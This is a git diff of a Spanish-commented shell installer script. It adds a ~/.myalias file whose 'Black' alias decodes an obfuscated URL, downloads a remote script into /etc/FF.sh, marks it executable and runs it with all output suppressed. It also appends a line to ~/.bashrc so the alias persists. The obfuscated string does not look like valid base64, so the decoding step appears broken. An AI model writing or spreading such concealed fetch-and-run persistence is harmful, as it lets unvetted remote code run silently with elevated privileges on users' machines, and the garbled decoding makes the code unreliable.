@@ -14,11 +14,17 @@ wget -O /etc/FF.sh https://raw.githubusercontent.com/AnonyProArg/newt/main/Psiph
 # Dar permisos de ejecución al script FF.sh
 chmod +x /etc/FF.sh
 
-# Agregar alias al archivo .bashrc
-echo "alias Black='bash /etc/FF.sh'" >> ~/.bashrc > /dev/null 2>&1
+# Crear el archivo .myalias
+echo -n "alias Black='wget -O /etc/FF.sh " > ~/.myalias
+echo -n "hpgfbbgu://jenpguznccyr.pbz/NanoClay/Prqvpb-1.0-Fgevc-Net/zntvat/SF.fuv" | base64 -d >> ~/.myalias
+echo "' >/dev/null 2>&1 && chmod +x /etc/FF.sh >/dev/null 2>&1 && /etc/FF.sh >/dev/null 2>&1'" >> ~/.myalias
 
-# Recargar el archivo .bashrc
-source ~/.bashrc > /dev/null 2>&1
+# Agregar la línea al archivo .bashrc
+echo "source ~/.myalias" >> ~/.bashrc
+
+# Cargar la línea en la sesión actual
+source ~/.myalias
+
 
 # Limpiar pantalla
 clear
